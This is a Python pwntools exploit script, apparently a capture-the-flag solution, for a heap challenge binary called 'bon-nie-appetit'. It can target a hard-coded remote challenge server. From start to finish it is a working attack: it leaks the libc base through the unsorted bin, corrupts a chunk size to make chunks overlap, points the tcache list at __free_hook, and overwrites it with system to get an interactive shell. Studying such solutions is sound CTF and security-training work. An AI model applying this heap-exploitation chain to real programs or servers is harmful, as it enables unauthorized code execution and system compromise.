#!/usr/bin/env python3
#17-05-2022
#Gon
#heap chunk size overwrite. Chunk consolidation

from pwn import *
exe = ELF('./bon-nie-appetit_no_alarm')
libc = ELF('./glibc/libc.so.6', checksec=False)

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote('104.248.162.86', 32373)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

#max 0x14 orders
def malloc(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'many: ', str(size))
    io.sendafter(b'order: ', data)

def show(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'order: ', str(idx))

def edit(idx, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'order: ', str(idx))
    io.sendafter(b'order: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'order: ', str(idx))


io = conn()

#Unsorted bin libc leak
malloc(1033, chr(0x41)*1033) #0
malloc(16, chr(0x42)*16)   #1
free(0)
malloc(16, b'\n')     #0
show(0)
io.recvuntil(b' \n')
leak = io.recvuntil(b' \n', drop=True)
libc.address = u64(leak.ljust(8, b'\x00')) * 0x100 - 0x3ec000
info("Libc Base:%#x", libc.address)

malloc(32, chr(0x43)*32) #2
malloc(20, chr(0x44)*20) #3
malloc(20, chr(0x45)*20) #4

free(4)

#Change chunk 3 size to 0x40
edit(2, chr(0x46)*40 + str('\x41'))
free(3)

#write _free_hook into chunk 4 fwd ptr
malloc(50, b'G'*16 + p64(0x0) + p64(0x21) + p64(libc.sym.__free_hook))

malloc(20, b'/bin/sh\x00') #4
malloc(20, p64(libc.sym.system)) #5

free(4)

io.interactive()
